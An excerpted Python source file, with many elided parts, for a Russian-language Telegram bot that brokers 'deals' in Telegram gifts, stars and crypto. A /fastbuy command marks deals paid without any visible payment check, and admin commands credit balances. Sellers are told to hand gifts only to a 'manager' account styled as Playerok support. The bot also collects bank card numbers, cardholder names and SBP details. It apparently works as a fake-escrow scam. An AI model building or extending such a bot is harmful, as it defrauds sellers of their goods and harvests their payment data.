...
# ==== ФОТО (локальный файл) ====
BOT_PHOTO = FSInputFile("bot_photo.jpg")
# ===============================
    ...
    if len(args) > 1 and args[1].startswith("deal_"):
        ...
        if deal:
            ...
            await message.answer_photo(
                photo=BOT_PHOTO,
                caption=f"🔍 Информация о сделке #{deal_id}\n\n"
...
async def add_rub_command(message: Message):
    ...
    if len(args) != 2:
        await message.answer_photo(
            photo=BOT_PHOTO,
            caption="❌ Использование: /addrub [сумма]\nПример: /addrub 100"
        )
        return
    ...
    try:
        ...
        if amount <= 0:
            await message.answer_photo(
                photo=BOT_PHOTO,
                caption="❌ Сумма должна быть положительной"
            )
            return
    except ValueError:
        await message.answer_photo(
            photo=BOT_PHOTO,
            caption="❌ Введите корректное число"
        )
        return
...
async def add_stars_command(message: Message):
    ...
    if len(args) != 2:
        await message.answer_photo(
            photo=BOT_PHOTO,
            caption="❌ Использование: /addstars [сумма]\nПример: /addstars 100"
        )
        return
...
async def add_usdt_command(message: Message):
    ...
    if len(args) != 2:
        await message.answer_photo(
            photo=BOT_PHOTO,
            caption="❌ Использование: /addusdt [сумма]\nПример: /addusdt 100"
        )
        return
...
async def add_ton_command(message: Message):
    ...
    if len(args) != 2:
        await message.answer_photo(
            photo=BOT_PHOTO,
            caption="❌ Использование: /addton [сумма]\nПример: /addton 100"
        )
        return
...
async def fast_buy(message: Message):
    ...
    if len(args) != 2:
        await message.answer_photo(
            photo=BOT_PHOTO,
            caption="❌ Использование: /fastbuy [ID сделки]\nПример: /fastbuy ABC123"
        )
        return
    ...
    if deal[9] != "waiting_for_payment":
        await message.answer_photo(
            photo=BOT_PHOTO,
            caption="❌ Эта сделка уже оплачена или завершена."
        )
        return
    ...
    await message.answer_photo(
        photo=BOT_PHOTO,
        caption=f"✅ Оплата подтверждена для сделки #{deal_id}!\n\n"
        ...
        try:
            await message.bot.send_photo(
                ...
                caption=f"✅ Оплата подтверждена для сделки #{deal_id}\n\n"
                        ...
                        f"⚠️ ВАЖНО:\n"
                        f"➤ Подарок необходимо передать ТОЛЬКО менеджеру @playerok_supportz\n"
                        f"➤ Средства будут зачислены только после проверки менеджером\n\n"
                        f"👇 После того как передадите подарок менеджеру, нажмите кнопку ниже:",
    ...
    for admin_id in ADMIN_IDS:
        try:
            await message.bot.send_photo(
                chat_id=admin_id,
                photo=BOT_PHOTO,
                caption=f"💰 Пользователь оплатил сделку!\n\n"
...
async def process_payment_method_first(callback: CallbackQuery, state: FSMContext):
    ...
    if method == "card" and (not wallets or not wallets[3]):
        ...
        await callback.message.edit_media(
            media=types.InputMediaPhoto(
                media=BOT_PHOTO,
                caption="❌ У вас не добавлена банковская карта!\n\n"
    ...
    if method == "ton" and (not wallets or not wallets[1]):
        ...
        await callback.message.edit_media(
            media=types.InputMediaPhoto(
                media=BOT_PHOTO,
                caption="❌ У вас не добавлен TON кошелек!\n\n"
    ...
    if method == "usdt" and (not wallets or not wallets[2]):
        ...
        await callback.message.edit_media(
            media=types.InputMediaPhoto(
                media=BOT_PHOTO,
                caption="❌ У вас не добавлен USDT кошелек!\n\n"
    ...
    if method == "sbp" and (not wallets or not wallets[6] or not wallets[7]):
        ...
        await callback.message.edit_media(
            media=types.InputMediaPhoto(
                media=BOT_PHOTO,
                caption="❌ У вас не добавлен номер СБП!\n\n"
...
async def process_seller_username(message: Message, state: FSMContext):
    ...
    if not username.startswith("@"):
        await message.answer_photo(
            photo=BOT_PHOTO,
            caption="❌ Username должен начинаться с @. Попробуйте снова."
        )
        return
    ...
    if not re.match(r'^[a-zA-Z0-9_]+$', username_without_at):
        await message.answer_photo(
            photo=BOT_PHOTO,
            caption="❌ Username может содержать только буквы, цифры и символ подчеркивания (_).\n"
...
async def process_amount(message: Message, state: FSMContext):
    try:
        ...
        await message.answer_photo(
            photo=BOT_PHOTO,
            caption="❌ Введите корректное положительное число."
        )
        return
    ...
    if method in min_amounts and amount < min_amount:
        ...
        await message.answer_photo(
            photo=BOT_PHOTO,
            caption=f"❌ Минимальная сумма - {min_amount} {currency}. Введите сумму еще раз:"
        )
        return
    ...
    await message.answer_photo(
        photo=BOT_PHOTO,
        caption="📝 Укажите, что вы предлагаете в этой сделке\n\n"
...
async def process_description(message: Message, state: FSMContext):
    ...
    if method == "stars":
        await message.answer_photo(
            photo=BOT_PHOTO,
            caption=f"✅ Сделка успешно создана!\n\n"
...
async def gift_transferred(callback: CallbackQuery):
    ...
    await callback.message.edit_media(
        media=types.InputMediaPhoto(
            media=BOT_PHOTO,
            caption=f"✅ Спасибо! Подарок отмечен как переданный.\n\n"
    ...
    for admin_id in ADMIN_IDS:
        try:
            await callback.bot.send_photo(
                chat_id=admin_id,
                photo=BOT_PHOTO,
                caption=f"📦 Продавец передал подарок по сделке!\n\n"
                        f"🔹 Номер сделки: #{deal_id}\n"
                        f"🔹 Продавец: {seller_username}\n"
...
async def confirm_code(message: Message):
    ...
    if len(args) != 2:
        await message.answer_photo(
            photo=BOT_PHOTO,
            caption="❌ Использование: /confirm <код>"
        )
        return
    ...
    if deal[9] != "payment_confirmed":
        await message.answer_photo(
            photo=BOT_PHOTO,
            caption="❌ Сделка не в статусе ожидания подтверждения."
        )
        return
    ...
    if deal[4]:
        try:
            await message.bot.send_photo(
                chat_id=deal[4],
                photo=BOT_PHOTO,
                caption=f"🔔 Покупатель ввел код по сделке #{deal[1]}!\n\n"
    ...
    await message.answer_photo(
        photo=BOT_PHOTO,
        caption="✅ Код принят! Продавец получил запрос на подтверждение.\n"
...
async def seller_confirm_receipt(callback: CallbackQuery):
    ...
    await callback.message.edit_media(
        media=types.InputMediaPhoto(
            media=BOT_PHOTO,
            caption="✅ Спасибо! Сделка завершена. Ожидайте перевода от администратора."
        )
    )
...
async def process_ton_wallet(message: Message, state: FSMContext):
    ...
    if len(ton_wallet) < 20 or not (ton_wallet.startswith('EQ') or ton_wallet.startswith('UQ')):
        await message.answer_photo(
            photo=BOT_PHOTO,
            caption="❌ Неверный формат TON кошелька. Попробуйте снова:"
        )
        return
    ...
    await message.answer_photo(
        photo=BOT_PHOTO,
        caption=f"✅ TON кошелек успешно сохранен!\n\nАдрес: {ton_wallet}",
        reply_markup=wallet_menu_keyboard()
    )
    await state.clear()
...
async def process_usdt_wallet(message: Message, state: FSMContext):
    ...
    if len(usdt_wallet) < 30 or not usdt_wallet.startswith('T'):
        await message.answer_photo(
            photo=BOT_PHOTO,
            caption="❌ Неверный формат USDT кошелька. Попробуйте снова:"
        )
        return
    ...
    await message.answer_photo(
        photo=BOT_PHOTO,
        caption=f"✅ USDT кошелек успешно сохранен!\n\nАдрес: {usdt_wallet}",
        reply_markup=wallet_menu_keyboard()
    )
    await state.clear()
...
async def process_card_number(message: Message, state: FSMContext):
    ...
    if not card_number.isdigit() or len(card_number) != 16:
        await message.answer_photo(
            photo=BOT_PHOTO,
            caption="❌ Неверный формат номера карты. Введите 16 цифр без пробелов:"
        )
        return
    ...
    await message.answer_photo(
        photo=BOT_PHOTO,
        caption="Введите имя владельца карты (как на карте):"
    )
...
async def process_card_holder(message: Message, state: FSMContext):
    ...
    if len(card_holder) < 3:
        await message.answer_photo(
            photo=BOT_PHOTO,
            caption="❌ Слишком короткое имя. Введите полное имя владельца:"
        )
        return
    ...
    await message.answer_photo(
        photo=BOT_PHOTO,
        caption="Введите название банка:"
    )
...
async def process_card_bank(message: Message, state: FSMContext):
    ...
    await message.answer_photo(
        photo=BOT_PHOTO,
        caption=f"✅ Банковская карта успешно сохранена!\n\n"
...
async def process_sbp_number(message: Message, state: FSMContext):
    ...
    await message.answer_photo(
        photo=BOT_PHOTO,
        caption="Введите имя получателя для СБП (как в банке):"
    )
...
async def process_sbp_name(message: Message, state: FSMContext):
    ...
    if len(sbp_name) < 3:
        await message.answer_photo(
            photo=BOT_PHOTO,
            caption="❌ Слишком короткое имя. Введите полное имя получателя:"
        )
        return
    ...
    await message.answer_photo(
        photo=BOT_PHOTO,
        caption=f"✅ СБП успешно сохранен!\n\n"
...
async def view_wallet(callback: CallbackQuery):
    ...
    if not wallets or all(v is None for v in wallets[1:]):
        await callback.message.edit_media(
            media=types.InputMediaPhoto(
                media=BOT_PHOTO,
                caption="❌ У вас пока нет сохраненных кошельков."
            ),
            reply_markup=wallet_menu_keyboard()
        )
        return
    ...
    await callback.message.edit_media(
        ...
        reply_markup=wallet_view_keyboard()
    )
